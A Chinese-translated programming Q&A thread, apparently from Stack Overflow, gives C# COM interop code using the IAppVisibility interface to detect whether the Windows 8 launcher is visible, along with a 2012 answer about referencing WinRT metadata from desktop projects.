使用[IAppVisibility](http://msdn.microsoft.com/en-us/library/windows/desktop/jj554119%28v=vs.85%29.aspx)接口而不是[过时的 IMetroMode 接口](http://social.msdn.microsoft.com/Forums/en-US/windowsgeneraldevelopmentissues/thread/1951e313-3c2b-40c7-89e9-e959a6d7ec31)

这是示例代码：

```
/* From ShObjIdl.idl
// CLSID_AppVisibility
[ uuid(7E5FE3D9-985F-4908-91F9-EE19F9FD1514)] coclass AppVisibility { interface IAppVisibility; }
 */
Type tIAppVisibility = Type.GetTypeFromCLSID(new Guid("7E5FE3D9-985F-4908-91F9-EE19F9FD1514"));
IAppVisibility appVisibility = (IAppVisibility)Activator.CreateInstance(tIAppVisibility);
bool launcherVisible;
if(HRESULT.S_OK == appVisibility.IsLauncherVisible(out launcherVisible)) {
    // Here you can use the launcherVisible flag
} 
```

IAppVisibility 接口定义：

```
[ComImport, Guid("2246EA2D-CAEA-4444-A3C4-6DE827E44313"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IAppVisibility {
    HRESULT GetAppVisibilityOnMonitor([In] IntPtr hMonitor, [Out] out MONITOR_APP_VISIBILITY pMode);
    HRESULT IsLauncherVisible([Out] out bool pfVisible);
    HRESULT Advise([In] IAppVisibilityEvents pCallback, [Out] out int pdwCookie);
    HRESULT Unadvise([In] int dwCookie);
}
//...
public enum HRESULT : long {
    S_FALSE = 0x0001,
    S_OK = 0x0000,
    E_INVALIDARG = 0x80070057,
    E_OUTOFMEMORY = 0x8007000E
}
public enum MONITOR_APP_VISIBILITY {
    MAV_UNKNOWN = 0,         // The mode for the monitor is unknown
    MAV_NO_APP_VISIBLE = 1,
    MAV_APP_VISIBLE = 2
}
[ComImport, Guid("6584CE6B-7D82-49C2-89C9-C6BC02BA8C38"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IAppVisibilityEvents {
    HRESULT AppVisibilityOnMonitorChanged(
        [In] IntPtr hMonitor,
        [In] MONITOR_APP_VISIBILITY previousMode,
        [In] MONITOR_APP_VISIBILITY currentMode);

    HRESULT LauncherVisibilityChange([In] bool currentVisibleState);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T17:47:59.943

几件事：

1.  看起来[已从 Windows 8 的 RC 和 RTM 版本中](http://social.msdn.microsoft.com/Forums/en-US/windowsgeneraldevelopmentissues/thread/1951e313-3c2b-40c7-89e9-e959a6d7ec31)`IMetroMode`删除。
2.  不要在 WinRT 调用上使用 P/Invoke，而是应该在 C# 项目中添加对来自`C:\Program Files (x86)\Windows Kits\8.0\References\CommonConfiguration\Neutral\`. 这将提供具有自动完成功能的互操作服务，该服务应提供对您需要的任何 WinRT 工具的访问。你可以[在这里找到更多信息](http://iinspectable.wordpress.com/2012/06/12/how-to-call-winrt-apis-from-c-desktop-applications-list-the-installed-metro-packages/)。